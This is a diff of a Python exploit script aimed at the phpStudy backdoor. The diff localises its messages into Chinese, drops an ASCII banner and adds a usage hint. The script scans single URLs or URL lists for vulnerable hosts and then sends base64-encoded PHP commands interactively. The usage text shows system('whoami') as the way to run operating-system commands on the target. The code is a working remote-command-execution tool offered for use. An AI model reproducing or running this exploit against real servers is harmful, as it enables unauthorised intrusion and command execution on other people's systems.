@@ -54,24 +54,6 @@ USER_AGENTS = [
 ]
 TIME_OUT=3
 
-print(r"""
- _____   _    _  _____    _____  _               _          ____                _        _                     
- |  __ \ | |  | ||  __ \  / ____|| |             | |        |  _ \              | |      | |                    
- | |__) || |__| || |__) || (___  | |_  _   _   __| | _   _  | |_) |  __ _   ___ | | __ __| |  ___    ___   _ __ 
- |  ___/ |  __  ||  ___/  \___ \ | __|| | | | / _` || | | | |  _ <  / _` | / __|| |/ // _` | / _ \  / _ \ | '__|
- | |     | |  | || |      ____) || |_ | |_| || (_| || |_| | | |_) || (_| || (__ |   <| (_| || (_) || (_) || |   
- |_|     |_|  |_||_|     |_____/  \__| \__,_| \__,_| \__, | |____/  \__,_| \___||_|\_\\__,_| \___/  \___/ |_|   
-                                                      __/ |                                                     
-                                                     |___/                                                      
-                    Usage & e.g. :
-                        Target Url:
-                        localhost/flag.php
-                        python3 phpstudy.py -u/-uf localhost/flag.php
-                        Input Your Command:
-                        phpinfo();
-                    Notice: Command Must Be PHP Function, If You Want To Execute OS Command, Use: system('YOUR COMMAND');
-                   
-""")
 
 def checkTarget(url):
     poc = {
@@ -81,13 +63,16 @@ def checkTarget(url):
     try:
         pocRequest = requests.get(url, headers=poc,timeout=TIME_OUT)
         if "phpinfo" in str(pocRequest.content):
-            print('[+] Target is vulnerable.')
+            #print('[+] Target is vulnerable.')
+            print("[Success]  主机:{}".format(url)+' 存在漏洞')
             return True
         else:
-            print('[-] Target is NOT vulnerable.')
+            #print('[-] Target is NOT vulnerable.')
+            print("[-]  主机:{}".format(url)+' 不存在漏洞')
             return False
     except :
-        print('[-] Looks Like Something Wrong.')
+        #print('[-] Looks Like Something Wrong.')
+        print("[gg]  主机:{}".format(url)+' GoodGame')
 
 
 def exploit(url,command):
@@ -107,6 +92,8 @@ def exploit(url,command):
 
 
 if __name__ == "__main__":
+    
+
     parser = argparse.ArgumentParser()
     
     parser.add_argument('-u', '--url', dest='url', help='Target Url')
@@ -117,8 +104,9 @@ if __name__ == "__main__":
         for url in args.urlfiles:
             if 'http' not in url:
                 url = "http://" + url
-            print("[INFO]     正在检测:{}".format(url)+'\n')
+            #print("[INFO]     正在检测:{}".format(url)+'\n')
             pool.apply(checkTarget, args=(url.strip('\n'),))
+            #checkTarget(url)
         pool.close()
         pool.join()
     elif args.url:
@@ -128,17 +116,10 @@ if __name__ == "__main__":
             cmd = input("Input Your Command:\n")
             command = base64.b64encode(cmd.encode('utf-8'))
             exploit(args.url,command)
-
-
-
-
-'''    while True:
-        url = input("Target Url:\n")
-        if 'http' not in url:
-            url = "http://" + url
-        print('[i] Checking Target...')
-        if checkTarget(url):
-            cmd = input("Input Your Command:\n")
-            command = base64.b64encode(cmd.encode('utf-8'))
-            exploit(url,command)
-'''
+    else:
+        print(r"""
+        缺少URL目标, 请使用 [-u URL] or [-uf urlfiles]
+        注意：输入命令如:
+              phpinfo();
+              命令必须是php函数, 如果你想执行系统命令，使用:system('whoami');
+        """)
